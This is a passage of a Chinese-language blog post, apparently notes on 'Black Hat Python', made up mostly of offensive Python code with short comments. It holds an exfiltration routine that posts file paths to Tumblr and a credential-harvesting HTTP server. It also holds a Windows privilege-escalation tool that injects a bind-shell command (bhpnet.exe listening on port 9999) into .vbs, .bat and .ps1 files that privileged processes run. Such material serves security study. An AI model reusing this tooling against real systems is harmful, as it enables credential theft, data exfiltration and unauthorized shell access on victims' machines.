+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Found: </span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>document_path</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>exfiltrate</span><span class=p>(</span><span class=n>document_path</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=nb>input</span><span class=p>(</span><span class=s2>&#34;Continue?&#34;</span><span class=p>)</span>
+</span></span></code></pre></div><p>加密filepath，po到tumblr去</p><hr><p>keygen.py & decryptor.py</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>zlib</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.PublicKey</span> <span class=kn>import</span> <span class=n>RSA</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>PKCS1_OAEP</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>new_key</span> <span class=o>=</span> <span class=n>RSA</span><span class=o>.</span><span class=n>generate</span><span class=p>(</span><span class=mi>2048</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>public_key</span> <span class=o>=</span> <span class=n>new_key</span><span class=o>.</span><span class=n>publickey</span><span class=p>()</span><span class=o>.</span><span class=n>exportKey</span><span class=p>(</span><span class=s2>&#34;PEM&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>private_key</span> <span class=o>=</span> <span class=n>new_key</span><span class=o>.</span><span class=n>exportKey</span><span class=p>(</span><span class=s2>&#34;PEM&#34;</span><span class=p>)</span> 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>encrypted</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;XxfaX7nfQ48K...................G2V+2zuq6ol8Cs=&#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>private_key</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;-----BEGIN RSA PRIVATE KEY-----
+</span></span></span><span class=line><span class=cl><span class=s2>MIIEpAIBAAKCAQEAyXUTgFoL/2EPKoN31l5Tlak7VxhdusNCWQKDfcN5Jj45GQ1o
+</span></span></span><span class=line><span class=cl><span class=s2>...................................
+</span></span></span><span class=line><span class=cl><span class=s2>vOGHt9D9yo3DOhyvJbedpi3u3g13G+FZFw6d1T8Jzm5eZUvG7WeUtg==
+</span></span></span><span class=line><span class=cl><span class=s2>-----END RSA PRIVATE KEY-----&#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>rsakey</span> <span class=o>=</span> <span class=n>RSA</span><span class=o>.</span><span class=n>importKey</span><span class=p>(</span><span class=n>private_key</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>rsakey</span> <span class=o>=</span> <span class=n>PKCS1_OAEP</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>rsakey</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>offset</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl><span class=n>decrypted</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>encrypted</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>encrypted</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>while</span> <span class=n>offset</span> <span class=o>&lt;</span> <span class=nb>len</span><span class=p>(</span><span class=n>encrypted</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>decrypted</span> <span class=o>+=</span> <span class=n>rsakey</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>encrypted</span><span class=p>[</span><span class=n>offset</span><span class=p>:</span><span class=n>offset</span> <span class=o>+</span> <span class=mi>256</span><span class=p>])</span>
+</span></span><span class=line><span class=cl>    <span class=n>offset</span> <span class=o>+=</span> <span class=mi>256</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># now we decompress to original</span>
+</span></span><span class=line><span class=cl><span class=n>plaintext</span> <span class=o>=</span> <span class=n>zlib</span><span class=o>.</span><span class=n>decompress</span><span class=p>(</span><span class=n>decrypted</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>plaintext</span><span class=p>)</span>
+</span></span></code></pre></div><p>就是加解密，原本是兩個檔案，但因為這很好理解他們想幹嘛，同時又都不長，就合併在一起了</p><hr><p>cred_server.py</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>http.server</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>socketserver</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib.error</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib.parse</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib.request</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>CredRequestHandler</span><span class=p>(</span><span class=n>http</span><span class=o>.</span><span class=n>server</span><span class=o>.</span><span class=n>SimpleHTTPRequestHandler</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>do_POST</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>content_length</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>headers</span><span class=p>[</span><span class=s1>&#39;Content-Length&#39;</span><span class=p>])</span>
+</span></span><span class=line><span class=cl>        <span class=n>creds</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>rfile</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=n>content_length</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>creds</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>site</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>path</span><span class=p>[</span><span class=mi>1</span><span class=p>:]</span>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>send_response</span><span class=p>(</span><span class=mi>301</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>send_header</span><span class=p>(</span><span class=s1>&#39;Location&#39;</span><span class=p>,</span> <span class=n>urllib</span><span class=o>.</span><span class=n>parse</span><span class=o>.</span><span class=n>unquote</span><span class=p>(</span><span class=n>site</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>end_headers</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>server</span> <span class=o>=</span> <span class=n>socketserver</span><span class=o>.</span><span class=n>TCPServer</span><span class=p>((</span><span class=s1>&#39;0.0.0.0&#39;</span><span class=p>,</span> <span class=mi>8080</span><span class=p>),</span> <span class=n>CredRequestHandler</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>server</span><span class=o>.</span><span class=n>serve_forever</span><span class=p>()</span>
+</span></span></code></pre></div><p>就是會顯示request的http server</p><h2 id=ch10>CH10<a hidden class=anchor aria-hidden=true href=#ch10>#</a></h2><p>這裡的目的是找出</p><p><strong>高權限process會使用的檔案，但其檔案可以被低權限的使用者取用的檔案</strong></p><p>以此繞過權限管制</p><p>下面的兩個code就是分別</p><ol><li>找出高權限(有趣的)process</li><li>當檔案被修改時插入我們的code</li></ol><p>process_monitor.py</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>win32con</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>win32api</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>win32security</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>wmi</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>LOG_FILE</span> <span class=o>=</span> <span class=s2>&#34;process_monitor_log.csv&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_process_privileges</span><span class=p>(</span><span class=n>pid</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=c1># obtain a handle to the target process</span>
+</span></span><span class=line><span class=cl>        <span class=n>hproc</span> <span class=o>=</span> <span class=n>win32api</span><span class=o>.</span><span class=n>OpenProcess</span><span class=p>(</span><span class=n>win32con</span><span class=o>.</span><span class=n>PROCESS_QUERY_INFORMATION</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                                     <span class=kc>False</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                                     <span class=n>pid</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=c1># open the main process token</span>
+</span></span><span class=line><span class=cl>        <span class=n>htok</span> <span class=o>=</span> <span class=n>win32security</span><span class=o>.</span><span class=n>OpenProcessToken</span><span class=p>(</span><span class=n>hproc</span><span class=p>,</span> <span class=n>win32con</span><span class=o>.</span><span class=n>TOKEN_QUERY</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=c1># retrieve the list of privileges enabled</span>
+</span></span><span class=line><span class=cl>        <span class=n>privs</span> <span class=o>=</span> <span class=n>win32security</span><span class=o>.</span><span class=n>GetTokenInformation</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>            <span class=n>htok</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=n>win32security</span><span class=o>.</span><span class=n>TokenPrivileges</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=c1># iterate over privileges and output the ones that are enabled</span>
+</span></span><span class=line><span class=cl>        <span class=n>priv_list</span> <span class=o>=</span> <span class=p>[]</span>
+</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>priv_id</span><span class=p>,</span> <span class=n>priv_flags</span> <span class=ow>in</span> <span class=n>privs</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=c1># check if the privilege is enabled</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>priv_flags</span> <span class=o>==</span> <span class=mi>3</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=n>priv_list</span><span class=o>.</span><span class=n>append</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>                    <span class=n>win32security</span><span class=o>.</span><span class=n>LookupPrivilegeName</span><span class=p>(</span><span class=kc>None</span><span class=p>,</span> <span class=n>priv_id</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>except</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>priv_list</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=s2>&#34;N/A&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s2>&#34;|&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>priv_list</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>log_to_file</span><span class=p>(</span><span class=n>message</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>fd</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=n>LOG_FILE</span><span class=p>,</span> <span class=s2>&#34;ab&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>fd</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%s</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>message</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>fd</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># create a log file header</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=ow>not</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>isfile</span><span class=p>(</span><span class=n>LOG_FILE</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>log_to_file</span><span class=p>(</span><span class=s2>&#34;Time,User,Executable,CommandLine,PID,ParentPID,Privileges&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># instantiate the WMI interface</span>
+</span></span><span class=line><span class=cl><span class=n>c</span> <span class=o>=</span> <span class=n>wmi</span><span class=o>.</span><span class=n>WMI</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># create our process monitor</span>
+</span></span><span class=line><span class=cl><span class=n>process_watcher</span> <span class=o>=</span> <span class=n>c</span><span class=o>.</span><span class=n>Win32_Process</span><span class=o>.</span><span class=n>watch_for</span><span class=p>(</span><span class=s2>&#34;creation&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>new_process</span> <span class=o>=</span> <span class=n>process_watcher</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>        <span class=n>proc_owner</span> <span class=o>=</span> <span class=n>new_process</span><span class=o>.</span><span class=n>GetOwner</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>        <span class=n>proc_owner</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>%s</span><span class=se>\\</span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=n>proc_owner</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>proc_owner</span><span class=p>[</span><span class=mi>2</span><span class=p>])</span>
+</span></span><span class=line><span class=cl>        <span class=n>create_date</span> <span class=o>=</span> <span class=n>new_process</span><span class=o>.</span><span class=n>CreationDate</span>
+</span></span><span class=line><span class=cl>        <span class=n>executable</span> <span class=o>=</span> <span class=n>new_process</span><span class=o>.</span><span class=n>ExecutablePath</span>
+</span></span><span class=line><span class=cl>        <span class=n>cmdline</span> <span class=o>=</span> <span class=n>new_process</span><span class=o>.</span><span class=n>CommandLine</span>
+</span></span><span class=line><span class=cl>        <span class=n>pid</span> <span class=o>=</span> <span class=n>new_process</span><span class=o>.</span><span class=n>ProcessId</span>
+</span></span><span class=line><span class=cl>        <span class=n>parent_pid</span> <span class=o>=</span> <span class=n>new_process</span><span class=o>.</span><span class=n>ParentProcessId</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=n>privileges</span> <span class=o>=</span> <span class=n>get_process_privileges</span><span class=p>(</span><span class=n>pid</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=n>process_log_message</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>%s</span><span class=s2>,</span><span class=si>%s</span><span class=s2>,</span><span class=si>%s</span><span class=s2>,</span><span class=si>%s</span><span class=s2>,</span><span class=si>%s</span><span class=s2>,</span><span class=si>%s</span><span class=s2>,</span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl>            <span class=n>create_date</span><span class=p>,</span> <span class=n>proc_owner</span><span class=p>,</span> <span class=n>executable</span><span class=p>,</span> <span class=n>cmdline</span><span class=p>,</span> <span class=n>pid</span><span class=p>,</span> <span class=n>parent_pid</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=n>privileges</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%s</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>process_log_message</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=n>log_to_file</span><span class=p>(</span><span class=n>process_log_message</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>except</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>pass</span>
+</span></span></code></pre></div><p>把所有新產生的process的權限列出來
+這邊使用的是windows WMI API</p><p>這邊有一些有趣的權限，但就不列出詳細的作用(懶)</p><ul><li>SeBackupPrivilege</li><li>SeDebugPrivilege</li><li>SeLoadDriver</li></ul><hr><p>file_monitor.py</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># Modified example that is originally given here:</span>
+</span></span><span class=line><span class=cl><span class=c1># http://timgolden.me.uk/python/win32_how_do_i/watch_directory_for_changes.html</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>tempfile</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>threading</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>win32file</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>win32con</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># these are the common temp file directories</span>
+</span></span><span class=line><span class=cl><span class=n>dirs_to_monitor</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;C:</span><span class=se>\\</span><span class=s2>WINDOWS</span><span class=se>\\</span><span class=s2>Temp&#34;</span><span class=p>,</span> <span class=n>tempfile</span><span class=o>.</span><span class=n>gettempdir</span><span class=p>()]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># file modification constants</span>
+</span></span><span class=line><span class=cl><span class=n>FILE_CREATED</span> <span class=o>=</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl><span class=n>FILE_DELETED</span> <span class=o>=</span> <span class=mi>2</span>
+</span></span><span class=line><span class=cl><span class=n>FILE_MODIFIED</span> <span class=o>=</span> <span class=mi>3</span>
+</span></span><span class=line><span class=cl><span class=n>FILE_RENAMED_FROM</span> <span class=o>=</span> <span class=mi>4</span>
+</span></span><span class=line><span class=cl><span class=n>FILE_RENAMED_TO</span> <span class=o>=</span> <span class=mi>5</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># extension based code snippets to inject</span>
+</span></span><span class=line><span class=cl><span class=n>file_types</span> <span class=o>=</span> <span class=p>{}</span>
+</span></span><span class=line><span class=cl><span class=n>command</span> <span class=o>=</span> <span class=s2>&#34;C:</span><span class=se>\\</span><span class=s2>WINDOWS</span><span class=se>\\</span><span class=s2>TEMP</span><span class=se>\\</span><span class=s2>bhpnet.exe –l –p 9999 –c&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>file_types</span><span class=p>[</span><span class=s1>&#39;.vbs&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>&#39;bhpmarker</span><span class=se>\r\n</span><span class=s2>&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                      <span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>CreateObject(</span><span class=se>\&#34;</span><span class=s2>Wscript.Shell</span><span class=se>\&#34;</span><span class=s2>).Run(</span><span class=se>\&#34;</span><span class=si>%s</span><span class=se>\&#34;</span><span class=s2>)</span><span class=se>\r\n</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl>                      <span class=o>%</span> <span class=n>command</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>file_types</span><span class=p>[</span><span class=s1>&#39;.bat&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>REM bhpmarker</span><span class=se>\r\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\r\n</span><span class=si>%s</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>command</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>file_types</span><span class=p>[</span><span class=s1>&#39;.ps1&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>#bhpmarker&#34;</span><span class=p>,</span> <span class=s2>&#34;Start-Process </span><span class=se>\&#34;</span><span class=si>%s</span><span class=se>\&#34;</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>command</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>inject_code</span><span class=p>(</span><span class=n>full_filename</span><span class=p>,</span> <span class=n>extension</span><span class=p>,</span> <span class=n>contents</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=c1># is our marker already in the file?</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>file_types</span><span class=p>[</span><span class=n>extension</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span> <span class=ow>in</span> <span class=n>contents</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># no marker let&#39;s inject the marker and code</span>
+</span></span><span class=line><span class=cl>    <span class=n>full_contents</span> <span class=o>=</span> <span class=n>file_types</span><span class=p>[</span><span class=n>extension</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>    <span class=n>full_contents</span> <span class=o>+=</span> <span class=n>file_types</span><span class=p>[</span><span class=n>extension</span><span class=p>][</span><span class=mi>1</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>    <span class=n>full_contents</span> <span class=o>+=</span> <span class=n>contents</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>fd</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=n>full_filename</span><span class=p>,</span> <span class=s2>&#34;wb&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>fd</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>full_contents</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
+</span></span><span class=line><span class=cl>    <span class=n>fd</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[\o/] Injected code.&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>return</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>start_monitor</span><span class=p>(</span><span class=n>path_to_watch</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=c1># we create a thread for each monitoring run</span>
+</span></span><span class=line><span class=cl>    <span class=n>file_list_directory</span> <span class=o>=</span> <span class=mh>0x0001</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>h_directory</span> <span class=o>=</span> <span class=n>win32file</span><span class=o>.</span><span class=n>CreateFile</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>        <span class=n>path_to_watch</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=n>file_list_directory</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=n>win32con</span><span class=o>.</span><span class=n>FILE_SHARE_READ</span>
+</span></span><span class=line><span class=cl>        <span class=o>|</span> <span class=n>win32con</span><span class=o>.</span><span class=n>FILE_SHARE_WRITE</span>
+</span></span><span class=line><span class=cl>        <span class=o>|</span> <span class=n>win32con</span><span class=o>.</span><span class=n>FILE_SHARE_DELETE</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=kc>None</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=n>win32con</span><span class=o>.</span><span class=n>OPEN_EXISTING</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=n>win32con</span><span class=o>.</span><span class=n>FILE_FLAG_BACKUP_SEMANTICS</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=kc>None</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=mi>1</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>results</span> <span class=o>=</span> <span class=n>win32file</span><span class=o>.</span><span class=n>ReadDirectoryChangesW</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>                <span class=n>h_directory</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=mi>1024</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=kc>True</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=n>win32con</span><span class=o>.</span><span class=n>FILE_NOTIFY_CHANGE_FILE_NAME</span> <span class=o>|</span>
+</span></span><span class=line><span class=cl>                <span class=n>win32con</span><span class=o>.</span><span class=n>FILE_NOTIFY_CHANGE_DIR_NAME</span> <span class=o>|</span>
+</span></span><span class=line><span class=cl>                <span class=n>win32con</span><span class=o>.</span><span class=n>FILE_NOTIFY_CHANGE_ATTRIBUTES</span> <span class=o>|</span>
+</span></span><span class=line><span class=cl>                <span class=n>win32con</span><span class=o>.</span><span class=n>FILE_NOTIFY_CHANGE_SIZE</span> <span class=o>|</span>
+</span></span><span class=line><span class=cl>                <span class=n>win32con</span><span class=o>.</span><span class=n>FILE_NOTIFY_CHANGE_LAST_WRITE</span> <span class=o>|</span>
+</span></span><span class=line><span class=cl>                <span class=n>win32con</span><span class=o>.</span><span class=n>FILE_NOTIFY_CHANGE_SECURITY</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=kc>None</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=kc>None</span>
+</span></span><span class=line><span class=cl>            <span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>action</span><span class=p>,</span> <span class=n>file_name</span> <span class=ow>in</span> <span class=n>results</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=n>full_filename</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>path_to_watch</span><span class=p>,</span> <span class=n>file_name</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>action</span> <span class=o>==</span> <span class=n>FILE_CREATED</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[ + ] Created </span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>full_filename</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                <span class=k>elif</span> <span class=n>action</span> <span class=o>==</span> <span class=n>FILE_DELETED</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[ - ] Deleted </span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>full_filename</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                <span class=k>elif</span> <span class=n>action</span> <span class=o>==</span> <span class=n>FILE_MODIFIED</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[ * ] Modified </span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>full_filename</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                    <span class=c1># dump out the file contents</span>
+</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[vvv] Dumping contents...&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                    <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                        <span class=n>fd</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=n>full_filename</span><span class=p>,</span> <span class=s2>&#34;rb&#34;</span><span class=p>)</span>
